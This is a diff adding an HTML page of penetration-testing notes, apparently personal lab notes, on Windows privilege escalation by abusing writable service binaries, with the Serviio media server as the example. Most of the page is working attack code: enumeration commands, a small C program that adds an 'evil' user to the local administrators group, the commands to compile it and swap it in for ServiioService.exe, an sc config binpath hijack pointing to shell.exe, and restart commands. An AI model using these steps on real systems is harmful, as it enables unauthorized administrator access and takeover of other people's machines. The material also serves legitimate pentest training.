@@ -1,0 +1,58 @@
+<p><a href="https://pentestlab.blog/2017/03/30/weak-service-permissions/">WPE-04 - Weak Service Permissions</a></p>
+
+<h1 id="serviio-case">serviio case</h1>
+<h2 id="-check-services">| check services</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /V
+</code></pre></div></div>
+<p>or</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic process get ProcessID,ExecutablePath
+</code></pre></div></div>
+<p>or:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+</code></pre></div></div>
+<p>serviio looks installed in program files .
+this means the service is user-installed and the software developer is in charge of the directory
+structure as well as permissions of the software.</p>
+<h2 id="-check-permissions">| check permissions</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+C:\Program Files\Serviio\bin\ServiioService.exe BUILTIN\Users:(I)(F)
+</code></pre></div></div>
+<p>it appears that any user (BUILTIN\Users) on the system has full read and
+write access to it.</p>
+<h2 id="-masks-permissions">| masks permissions</h2>
+<ul>
+  <li>F Full access</li>
+  <li>M Modify access</li>
+  <li>RX Read and execute access</li>
+  <li>R Read-only access</li>
+  <li>W Write-only access</li>
+</ul>
+
+<h2 id="-compile-binary-to-replace-serviio">| compile binary to replace serviio</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
+int main ()
+{
+int i;
+i = system ("net user evil Ev!lpass /add");
+i = system ("net localgroup administrators evil /add");
+return 0;
+}
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe
+</code></pre></div></div>
+
+<h2 id="-replace-the-binary">| replace the binary</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
+</code></pre></div></div>
+
+<h2 id="-option-2-chane-registry">| option 2 chane registry</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"
+</code></pre></div></div>
+<h2 id="-restart-service">| restart service</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net stop Serviio
+</code></pre></div></div>
+<p>if we dont have access to restart a service we can reboot maybe?</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shutdown /r /t 0
+</code></pre></div></div>
